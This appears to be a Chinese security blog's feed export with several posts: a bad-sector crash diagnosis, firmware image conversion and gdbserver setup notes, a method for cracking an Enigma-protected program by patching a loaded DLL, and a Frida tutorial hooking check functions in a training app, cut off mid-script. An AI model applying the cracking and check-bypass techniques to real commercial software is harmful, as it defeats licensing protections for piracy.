<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>&ensp;&ensp;&ensp;&ensp;N个月前的某天正在沉迷于工作的时候，同事说公司财务电脑崩溃了，报了个奇怪的内存错误，让帮忙看看。之前去财务的时候曾经听财务说过这个问题，据说是Excel里面如果选中几个单元格再点击右键就会崩溃，同事帮重装了下Office之后，奇特的事情发生了，重启电脑之后资源管理器进程Explorer.exe闪现了下就崩溃无法进入桌面环境，当然不是我自己的电脑一般都建议重装了，无奈财务电脑里软件数据较多，无法重装。万般无奈之下只好接手看看情况了，毕竟关系到下月工资吃饭呢。。。
<a id="more"></a>

<hr>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>&ensp;&ensp;&ensp;&ensp;首先查看进程崩溃信息中，根据显示的异常号也看不出什么具体信息，但是能看到问题出在Explorer.exe进程中的m**.dll中（名字忘了，凑合看吧），该DLL是Office程序注册到Explorer.exe进程的组件，所以问题还是Office的问题。
<p>&ensp;&ensp;&ensp;&ensp;因为Explorer.exe进程奔溃，无法进入到资源管理器，且主机上还装了数字杀软，我的Od变种出现即被报毒，导入调试工具都折腾了好久，首先Win+R调起CMD窗口，然后Dir尝试出U盘盘符，在命令行里运行我的Od，设置成默认调试器，因为进程早已崩溃，还需要重启再次触发，还好能够稳定触发该Bug，重启之后进程崩溃终于把我的Od挂起来了。然而更奇特的事情出现，Od在加载许久之后报错“m**.dll不存在”，这现象有点迷，明明刚还能在崩溃信息里查看到该DLL存在，在该DLL文件夹中dir也是可以看到DLL存在的，终于在尝试把这个“不存在“的dll拷贝出来分析的时候爆出了信息框：[“无法访问磁盘,数据错误(循环冗余检查)”!]
<p>&ensp;&ensp;&ensp;&ensp;到此问题就清楚了，应该是该DLL所在的磁盘扇区出现了磁盘坏道，之前财务所说的Excel选中单元格右键时崩溃的现象也就可以解释了，应该是右键菜单调用的代码引用了磁盘坏道处的数据。而重装Office之后m**.dll覆盖了坏道位置，导致Explorer.exe进程引用该DLL时挂掉了。现在看其实发现该问题并不难，也根本不需要调试代码，最麻烦的反而是导入调试器。

<hr>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>&ensp;&ensp;&ensp;&ensp;磁盘坏道一般分为逻辑坏道和物理坏道，如果时逻辑坏道还好说，可以尝试使用DiskGenius等工具修复，物理坏道也即磁盘损坏较麻烦，也可以使用一些工具屏蔽坏道。当然对于我司来说不差硬盘钱没必要这样折腾，数据就直接换个新硬盘克隆下旧的，现在硬盘也不贵。
<p>&ensp;&ensp;&ensp;&ensp;克隆磁盘数据镜像一般Winhex（工具->磁盘工具->克隆磁盘）就足够用了，为了确保数据靠谱，我还专门进了个PE（推荐WEPE哦~）对拷磁盘数据，拷贝完之后还有最后一个问题，磁盘坏道数据无法正常导出，导致最终克隆的m**.dll数据错误，需要从正常的机器上重新拷贝一个dll过来，搞完收工~

<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&ensp;&ensp;&ensp;&ensp;这里还是遗留一些需深入研究的地方，为什么磁盘坏道数据损坏了该DLL仍然能被成功LoadLibrary呢？因为环境限制也一直没来及深究，此处就留个疑问吧。有了解的可以赐教下。]]></content>
      <categories>
        <category>取证相关</category>
      </categories>
      <tags>
        <tag>修电脑</tag>
        <tag>磁盘坏道</tag>
        <tag>Winhex</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-24-常见格式固件镜像转换编辑工具</title>
    <url>/2020/02/24/2020-02-24-%E5%B8%B8%E8%A7%81%E6%A0%BC%E5%BC%8F%E5%9B%BA%E4%BB%B6%E9%95%9C%E5%83%8F%E8%BD%AC%E6%8D%A2%E7%BC%96%E8%BE%91%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<blockquote>
<p>先做记录用，后续继续补充，整理下之前用到过的一些镜像转换、编辑工具，以及一些镜像如何打包gdbserver进行调试（打包gdb的内容移到另一篇了）等，常见情况下其中一两款工具就可以满足需求了，我也是少数情况下某个工具出现问题或者特定环境下换用其它的。</p>
</blockquote>
<a id="more"></a>
<h2 id="vmdk、qcow2、img、vhdx-vhd-等格式互转工具"><a href="#vmdk、qcow2、img、vhdx-vhd-等格式互转工具" class="headerlink" title="vmdk、qcow2、img、vhdx(vhd)等格式互转工具"></a>vmdk、qcow2、img、vhdx(vhd)等格式互转工具</h2><h3 id="starwind"><a href="#starwind" class="headerlink" title="starwind"></a>starwind</h3><p>Windows平台上运行，基本上常见的格式也都支持，运行傻瓜化，直接选择源文件设定格式导出即可。</p>
<h3 id="qemu-img"><a href="#qemu-img" class="headerlink" title="qemu-img"></a>qemu-img</h3><p>一般随Qemu一起安装的，Win及Linux都可用，使用命令：<br>qemu-img convert -f qcow2 file.qcow2 -O vmdk file.vmdk</p>
<h3 id="virtualbox："><a href="#virtualbox：" class="headerlink" title="virtualbox："></a>virtualbox：</h3><p>VBoxManage.exe convertfromraw disk.img disk.vmdk –format VMDK</p>
<h2 id="镜像编辑加载工具"><a href="#镜像编辑加载工具" class="headerlink" title="镜像编辑加载工具"></a>镜像编辑加载工具</h2><h3 id="guestmount"><a href="#guestmount" class="headerlink" title="guestmount"></a>guestmount</h3><p>ubuntu系统里guestmount是包含在libguestfs-tools里的。<br>guestmount -a xyz.vmdk -m /dev/sda3 –ro /mnt/vmdk<br>或者尝试自动检测格式：<br>guestmount -a xyz.vmdk -i –ro /mnt/vmdk<br>如果需要设置成可读写加载，可以使用 –rw 选项。</p>
<h3 id="winhex"><a href="#winhex" class="headerlink" title="winhex"></a>winhex</h3><p>最近惊奇的发现最新版本可以识别LVM分区了，使用也比较简单，直接打开IMG格式的磁盘文件，设置目标镜像为磁盘即可，只不过winhex编辑文件不够方便。</p>
<h3 id="qemu-nhd"><a href="#qemu-nhd" class="headerlink" title="qemu-nhd"></a>qemu-nhd</h3><p>一般常见的磁盘镜像格式通过上述方式就可以加载，但是遇到含有lvm卷的镜像，一般通过qemu-nhd配合mount的方式来加载。<br>sudo  modprobe nbd max_part=16<br>lsmod | grep nbd<br>sudo vgscan<br>sudo lvscan<br>sudo pvscan<br>sudo fdisk -l /dev/nbd0<br>sudo qemu-nbd -c /dev/nbd0    <em>.img -f raw  （-f指定源镜像格式）<br>ls -l /dev/mapper/<br>mount /dev/mapper/rootvg-</em> ./test/<br>sudo qemu-nbd -d /dev/nbd0    （-c 参数为connect，-d为断开连接）<br>sudo umount /dev/mapper/rootvg-* test/</p>
<h3 id="winmount"><a href="#winmount" class="headerlink" title="winmount"></a>winmount</h3><p>其实这个不怎样常用，只是自己比较喜欢，以前经常使用的压缩软件，由大神刘涛涛出品的，可惜很久就不更新了，这个软件可以直接挂载VMDK格式的Windows磁盘分区。。。操作一些windows的vm比较方便。</p>
<h2 id="奇形怪状的玩意"><a href="#奇形怪状的玩意" class="headerlink" title="奇形怪状的玩意"></a>奇形怪状的玩意</h2><h3 id="加密的LVM2分区"><a href="#加密的LVM2分区" class="headerlink" title="加密的LVM2分区"></a>加密的LVM2分区</h3><p>这个真是活久见，类似于windows的bitlock驱动器加密。<br><a href="https://www.nowherelan.com/2011/04/18/how-to-mount-an-encrypted-lvm-partition/" target="_blank" rel="noopener">https://www.nowherelan.com/2011/04/18/how-to-mount-an-encrypted-lvm-partition/</a><br><a href="http://blog.gnu-designs.com/solved-howto-mount-an-external-encrypted-luks-volume-under-linux/" target="_blank" rel="noopener">http://blog.gnu-designs.com/solved-howto-mount-an-external-encrypted-luks-volume-under-linux/</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stackoverflow.com/questions/22327728/mounting-vmdk-disk-image" target="_blank" rel="noopener">https://stackoverflow.com/questions/22327728/mounting-vmdk-disk-image</a><br><a href="https://www.jianshu.com/p/6b977c02bfb2" target="_blank" rel="noopener">https://www.jianshu.com/p/6b977c02bfb2</a></p>
]]></content>
      <categories>
        <category>取证相关</category>
      </categories>
      <tags>
        <tag>Winhex</tag>
        <tag>qemu-nhd</tag>
        <tag>guestmount</tag>
        <tag>vmdk</tag>
        <tag>qcow2</tag>
        <tag>vhdx</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-24-常见设备固件GDB调试环境搭建小记</title>
    <url>/2020/02/24/2020-02-24-%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6GDB%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>本来想合并到上一篇固件镜像转换的，但是好像关系不大。没啥技术含量，备份下操作步骤及相关工具。</p>
</blockquote>
<a id="more"></a>
<h2 id="镜像格式转换"><a href="#镜像格式转换" class="headerlink" title="镜像格式转换"></a>镜像格式转换</h2><p>一般为了方便都转化成vmware的VMDK格式了，有很多设备也直接提供ova或者vmdk格式的镜像，格式转换相关内容件见上一篇文章。</p>
<h3 id="Cisco-ASA的Qcow2"><a href="#Cisco-ASA的Qcow2" class="headerlink" title="Cisco ASA的Qcow2"></a>Cisco ASA的Qcow2</h3><p>此处单独提一下Cisco ASA的差异，网络上的Cisco ASA固件有一部分是qcow2格式，有一部分是img格式，这两种就没必要来回转换了，因为加载ASA的qcow2固件可以看到qcow2里面是包含了img格式的固件的。Cisco ASA的固件格式解析及打包gdbserver可以看看nccgroup出的asatools：<a href="https://github.com/nccgroup/asatools" target="_blank" rel="noopener">https://github.com/nccgroup/asatools</a><br>照着上面的文章可以对大部分asa的qcow2格式固件打包gdbserver调试，之前也搜集过一部分asa各版本的qcow2格式固件，有需要可以邮箱联系。</p>
<h2 id="不同平台静态编译的gdbserver等"><a href="#不同平台静态编译的gdbserver等" class="headerlink" title="不同平台静态编译的gdbserver等"></a>不同平台静态编译的gdbserver等</h2><h3 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h3><p>Embedded_toolkit：<a href="https://github.com/akpotter/embedded-toolkit" target="_blank" rel="noopener">https://github.com/akpotter/embedded-toolkit</a><br>里面还包含了一些其它的工具，像netstat等。</p>
<h3 id="ida-linux-server"><a href="#ida-linux-server" class="headerlink" title="ida linux_server"></a>ida linux_server</h3><p>IDA自带了一些静态编译的arm、linux平台的linux_server，也可以在一些环境下适用。</p>
<h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h3><p>下载：<a href="busybox.zip" target="_blank">链接</a></p>
<h2 id="运行gdbserver的方式"><a href="#运行gdbserver的方式" class="headerlink" title="运行gdbserver的方式"></a>运行gdbserver的方式</h2><p>如果不需要自启动的话，且拥有一个能直接运行程序的shell就直接运行就行，如果没有可用的shell或者想自启动，可以尝试以下方式。</p>
<h3 id="rcS脚本或rc-d"><a href="#rcS脚本或rc-d" class="headerlink" title="rcS脚本或rc.d"></a>rcS脚本或rc.d</h3><p>在固件启动项里加入。</p>
<h3 id="inittab"><a href="#inittab" class="headerlink" title="inittab"></a>inittab</h3><p>之前试过一个有意思的配置gdbserver场景，一个linux平台的固件设备系统，将其转化为vmware虚拟机之后，没有可执行命令的shell，后来修改启动文件inittab中设置的ctrl+alt+delete对应的命令为执行ida的linux_server,在vmware点击ctrl+alt+delete按钮后，就可以IDA连接进行调试了。</p>
]]></content>
      <categories>
        <category>设备固件</category>
      </categories>
      <tags>
        <tag>gdbserver</tag>
        <tag>inittab</tag>
        <tag>rcS</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-04-11-修改DLL文件不脱壳爆破虚拟机强壳</title>
    <url>/2020/04/11/2020-04-11-%E4%BF%AE%E6%94%B9DLL%E6%96%87%E4%BB%B6%E4%B8%8D%E8%84%B1%E5%A3%B3%E7%88%86%E7%A0%B4%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%BC%BA%E5%A3%B3/</url>
    <content><![CDATA[<blockquote>
<p>声明：仅作研究目的，不牵扯相关产品信息。<br>整理下之前见到过的一些绕过强虚拟机壳破解的知识，最近又见到一个Enigma加壳的64位程序，小伙伴让看看好不好破解，这个程序的注册算法还使用了Enigma的SDK保护，最初简单看了看都打算放弃了，后来意外发现这个程序SDK保护的并不完全，依旧存在被破解的可能，所以在实现软件保护方案时需要注意可能一个很小的疏忽都可能导致产品被攻破的。</p>
</blockquote>
<a id="more"></a>
<h2 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h2><p>首先简单总结下我了解的不脱壳的情况下破解或者修改程序功能的相关技术。</p>
<ol>
<li>传统的内存补丁<br>常见的工具有Baymax、AT4RE、樱花内存补丁等，前面两个的功能都非常强大，可以看看具体介绍（之前见到这两个介绍还可以支持硬件断点patch等，这次情况因为有些反调试，情况特殊，也没来及尝试），这几个其实一直都没需求使用过，樱花的比较简单，大致原理好像是用DLL注入的形式，在程序运行稳定的状态下注入DLL完成代码的修改过程，樱花内存补丁工具还可以设置定时patch的功能，相对简单。</li>
<li>硬件断点HOOK法<br>这种情况适用于程序的反调试比较弱或没有检查硬件断点的情况，当然如果出现这种情况也可以处理，就是稍微麻烦点，见之前破解某个木马配置端的博文：<br><a href="https://huhu0706.github.io/2018/01/10/2018-01-10-%E4%B8%8D%E8%84%B1%E5%A3%B3%E7%88%86%E7%A0%B4%E6%9F%90VMP%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/">https://huhu0706.github.io/2018/01/10/2018-01-10-%E4%B8%8D%E8%84%B1%E5%A3%B3%E7%88%86%E7%A0%B4%E6%9F%90VMP%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/</a></li>
<li>DLL修改或劫持法<br>一般情况下程序加载自带的DLL时，壳的代码已经执行完毕，这个时候程序大部分字符串可在内存中搜索看到，可以将补丁代码设置在程序加载的DLL里，或是利用dll劫持新制作一个补丁dll，或是直接在程序dll里添加补丁功能。樱花补丁工具也有配置lpk.dll劫持补丁的选项，但我一直没有需求没使用过。</li>
</ol>
<h2 id="破解流程"><a href="#破解流程" class="headerlink" title="破解流程"></a>破解流程</h2><p>这里只简单说下思路，就不提是什么软件具体怎么破解了。</p>
<ol>
<li>x64dbg运行程序，在一些关键API处下断，确保程序主功能已经运行完毕之后断下。</li>
<li>搜索主程序模块中字符串引用，设置硬件断点重新运行，注意如果程序有反硬件断点之类的话，可以找到一个不被检测的API断点（壳代码运行完毕且注册代码未运行的位置），运行中断后再设置硬件断点等，很多地方的引用可能无法追溯到关键跳，需要多尝试定位。</li>
<li>确定爆破点之后再测试程序所加载的DLL，dll加载时壳代码是否已经运行完毕，且需保证爆破点代码未执行，例如这次破解的QT类程序的QT库，修改其DLL代码加入对主程序爆破点的补丁代码即可。</li>
</ol>
<p>这个程序虽然使用了SDK保护核心算法，但是对注册完成之后的结果结构体解析时候未进行保护，通过分析对该结构体的多处解析判断操作澄清其成员含义，最终patch该结构体完成破解，虽然看着简单点，其实还是需要大量分析尝试的，有一定的侥幸，要确保该结果结构体是第一次生成还未被其它代码解析，同时存在可能存在结构体格式校验复杂无法伪造等情况。</p>
]]></content>
      <categories>
        <category>脱壳破解</category>
      </categories>
      <tags>
        <tag>X64dbg</tag>
        <tag>Enigma</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-05-07-Frida常用Hook安卓APP方式</title>
    <url>/2020/05/07/2020-05-07-Frida%E5%B8%B8%E7%94%A8Hook%E5%AE%89%E5%8D%93APP%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>最近学习了下看雪的安卓培训网课，但是时间比较紧张，才抽空学了几节，课程很不错内容很干（大力推荐），例子动手做了一遍，记录下Frida常用的Hook方法，后续可能会根据内容拆成几篇总结（自己记录备忘用，主要还是靠多练习额。。光看这些没用，而且这里总结的也不够全面。详细的讲解还是推荐去听看雪的课，因版权限制附件先暂不提供下载），先备份下等有空了再把相关知识好好写写，现在根本不是能给人看的东西。。。。</p>
</blockquote>
<a id="more"></a>
<h2 id="L1：-Frida-Hook-Java"><a href="#L1：-Frida-Hook-Java" class="headerlink" title="L1： Frida Hook Java"></a>L1： Frida Hook Java</h2><p>hook_l1.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    //hook java static函数</span><br><span class="line">    Java.perform(function ()</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(&quot;[*]:&quot; + &quot;L0\n&quot;);</span><br><span class="line">        var LoginActivity = Java.use(&quot;com.example.androiddemo.Activity.LoginActivity&quot;);  </span><br><span class="line">        LoginActivity.a.overload(&apos;java.lang.String&apos;, &apos;java.lang.String&apos;).implementation = function (arg0)&#123;</span><br><span class="line">            console.log(&quot;L1:&quot;,arg0,this.a(arg0,arg0));</span><br><span class="line">            return &quot;kanxue&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;[*]:&quot; + &quot;L1\n&quot;);</span><br><span class="line">        var FridaActivity1 = Java.use(&quot;com.example.androiddemo.Activity.FridaActivity1&quot;);</span><br><span class="line">        FridaActivity1.a.implementation = function(arg0)&#123;</span><br><span class="line">            console.log(&quot;L2:&quot;,this.a(arg0));</span><br><span class="line">            return &quot;R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    //可以通过call_FridaActivity2方式主动调用 也可以通过下面的方式重写check函数 check函数中直接调用或choose调用其他静态或非静态函数均可</span><br><span class="line"></span><br><span class="line">    Java.perform(function()&#123;    </span><br><span class="line">        console.log(&quot;[*]:&quot; + &quot;L2\n&quot;);</span><br><span class="line">        var FridaActivity2 = Java.use(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;);</span><br><span class="line">        FridaActivity2.onCheck.implementation = function()&#123;</span><br><span class="line">            this.setStatic_bool_var();</span><br><span class="line">            Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity2&quot; , &#123;</span><br><span class="line">                onMatch : function(instance)&#123;</span><br><span class="line">                    instance.setBool_var();</span><br><span class="line">                &#125;,</span><br><span class="line">                onComplete : function()&#123;</span><br><span class="line"></span><br><span class="line">                &#125; </span><br><span class="line">            &#125;);</span><br><span class="line">            // 不用Java.choose直接调用this.setBool_var也可</span><br><span class="line">            //this.setBool_var();</span><br><span class="line">            return this.onCheck();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">//注意主动调用只有在示例存在时调用才有效，在未进入该activity时调用无效</span><br><span class="line">function call_FridaActivity2()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var FridaActivity2 = Java.use(&quot;com.example.androiddemo.Activity.FridaActivity2&quot;);</span><br><span class="line">        FridaActivity2.setStatic_bool_var();</span><br><span class="line">        Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity2&quot; , &#123;</span><br><span class="line">            onMatch : function(instance)&#123;</span><br><span class="line">                instance.setBool_var();</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete : function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">//修改变量</span><br><span class="line">function call_FridaActivity3()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var FridaActivity3 =Java.use(&quot;com.example.androiddemo.Activity.FridaActivity3&quot;);</span><br><span class="line">        FridaActivity3.static_bool_var.value = true;</span><br><span class="line">        console.log(FridaActivity3.static_bool_var.value);</span><br><span class="line">        Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity3&quot; , &#123;</span><br><span class="line">            onMatch : function(instance)&#123;</span><br><span class="line">                instance.bool_var.value = true;</span><br><span class="line">                instance._same_name_bool_var.value = true;</span><br><span class="line">                console.log(instance.bool_var.value,instance._same_name_bool_var.value)</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete : function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">//hook innerclass</span><br><span class="line">function call_FridaActivity4()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var FridaActivity4InnerClass =Java.use(&quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;);</span><br><span class="line">        console.log(FridaActivity4InnerClass);</span><br><span class="line">        FridaActivity4InnerClass.check1.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        FridaActivity4InnerClass.check2.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        FridaActivity4InnerClass.check3.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        FridaActivity4InnerClass.check4.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        FridaActivity4InnerClass.check5.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        FridaActivity4InnerClass.check6.implementation = function()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function call_FridaActivity4_hookmulclass()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var classname = &quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;;</span><br><span class="line">        var FridaActivity4InnerClass =Java.use(classname);</span><br><span class="line">        //console.log(FridaActivity4InnerClass.class.getDeclaredMethods());</span><br><span class="line">        var allMethods = FridaActivity4InnerClass.class.getDeclaredMethods();</span><br><span class="line">        for(var i = 0; i&lt; allMethods.length ;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            console.log(allMethods[i]);</span><br><span class="line">            var method = allMethods[i];</span><br><span class="line">            var methodStr = method.toString();</span><br><span class="line">            //字符串处理</span><br><span class="line">            var substring = methodStr.substr(methodStr.indexOf(classname) + classname.length + 1);</span><br><span class="line">            var methodname = substring.substr(0,substring.indexOf(&quot;(&quot;));</span><br><span class="line">            console.log(methodname);</span><br><span class="line">            FridaActivity4InnerClass[methodname].implementation = function ()&#123;</span><br><span class="line">                console.log(&quot;hook mul function\n&quot;,this);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">//hook动态加载的类</span><br><span class="line">function call_FridaActivity5_hookdyndex()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var FridaActivity5 = Java.use(&quot;com.example.androiddemo.Activity.FridaActivity5&quot;);</span><br><span class="line">        Java.choose(&quot;com.example.androiddemo.Activity.FridaActivity5&quot;,&#123;</span><br><span class="line">            onMatch : function (instance)&#123;</span><br><span class="line">                console.log(instance.getDynamicDexCheck().$className);</span><br><span class="line">             &#125;,onComplete: function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            onMatch : function(loader)&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if(loader.findClass(&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;))</span><br><span class="line">                    &#123;</span><br><span class="line">                        console.log(loader);</span><br><span class="line">                        Java.classFactory.loader = loader;</span><br><span class="line">                    &#125;                    </span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete : function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        var DynamicCheck = Java.use(&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;);</span><br><span class="line">        console.log(DynamicCheck);</span><br><span class="line">        DynamicCheck.check.implementation = function ()&#123;</span><br><span class="line">            console.log(&quot;DynamicCheck.check&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function call_FridaActivity6()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(com.example.androiddemo.Activity.Frida6);</span><br><span class="line">        var Frida6Class0 = Java.use(&quot;com.example.androiddemo.Activity.Frida6.Frida6Class0&quot;);</span><br><span class="line">        Frida6Class0.check.implementation = function ()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        var Frida6Class1 = Java.use(&quot;com.example.androiddemo.Activity.Frida6.Frida6Class1&quot;);</span><br><span class="line">        Frida6Class1.check.implementation = function ()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">        var Frida6Class2 = Java.use(&quot;com.example.androiddemo.Activity.Frida6.Frida6Class2&quot;);</span><br><span class="line">        Frida6Class2.check.implementation = function ()&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function call_FridaActivity6_mulclass()</span><br><span class="line">&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(name ,handle)&#123;</span><br><span class="line">                if(name.indexOf(&quot;com.example.androiddemo.Activity.Frida6&quot;) &gt;= 0)&#123;</span><br><span class="line">                    console.log(name);</span><br><span class="line">                    var tmp = Java.use(name);</span><br><span class="line">                    tmp.check.implementation = function()&#123;</span><br><span class="line">                        console.log(&quot;Frida6 Check&quot;);</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete : function()</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">function main()</span><br><span class="line">&#123;</span><br><span class="line">    hook_java();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>

<h2 id="L2：-Frida-动态加载DEX"><a href="#L2：-Frida-动态加载DEX" class="headerlink" title="L2： Frida 动态加载DEX"></a>L2： Frida 动态加载DEX</h2><p>自己编译的Decode.java:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.example.mytest;</span><br><span class="line"></span><br><span class="line">public class Decode &#123;</span><br><span class="line">    public static String decode_p()&#123;</span><br><span class="line">        String str1 = &quot;&quot;;</span><br><span class="line">        String p = &quot;V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003&quot;;</span><br><span class="line">        str1 = a(p);</span><br><span class="line">        return str1;</span><br><span class="line">    &#125;;</span><br><span class="line">    public static String a(String str) &#123;</span><br><span class="line">        char[] charArray = str.toCharArray();</span><br><span class="line">        for (int i = 0; i &lt; charArray.length / 2; i++) &#123;</span><br><span class="line">            char c = charArray[i];</span><br><span class="line">            charArray[i] = (char) (charArray[(charArray.length - i) - 1] ^ &apos;A&apos;);</span><br><span class="line">            charArray[(charArray.length - i) - 1] = (char) (c ^ &apos;2&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        return new String(charArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String s2hex()&#123;</span><br><span class="line">        String r = &quot;\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000&quot;;</span><br><span class="line">        byte r_bytearray[] = r.getBytes();</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        for (int i = 0;i &lt; r_bytearray.length ;i++)&#123;</span><br><span class="line">            result = result + String.format(&quot;%02x&quot;,r_bytearray[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hook_l2.js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// bullhead:/ # input text &quot;codenameduchess&quot;                                      </span><br><span class="line">// bullhead:/ # input text guest                                                  </span><br><span class="line">// bullhead:/ # input text &quot;Boris, give me the password&quot;                            </span><br><span class="line">// bullhead:/ # input text &quot; ay I *P EASE* h ve the  assword &quot;  </span><br><span class="line">function hook_java()</span><br><span class="line">&#123;</span><br><span class="line">    var ddex = Java.openClassFile(&quot;/data/local/tmp/ddex.dex&quot;);</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        ddex.load();</span><br><span class="line">        var system_class = Java.use(&quot;java.lang.System&quot;);</span><br><span class="line">        system_class.getProperty.overload(&apos;java.lang.String&apos;).implementation = function (arg1)&#123;</span><br><span class="line">            if (arg1 == &quot;user.home&quot;) &#123;</span><br><span class="line">                console.log(&quot;userhome:&quot; + this.getProperty(&quot;user.home&quot;));</span><br><span class="line">                return &quot;Russia&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            return this.getProperty(&quot;user.home&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        system_class.getenv.overload(&apos;java.lang.String&apos;).implementation = function(arg1)&#123;</span><br><span class="line">            console.log(&quot;user:&quot; + this.getenv(&quot;USER&quot;));</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            return 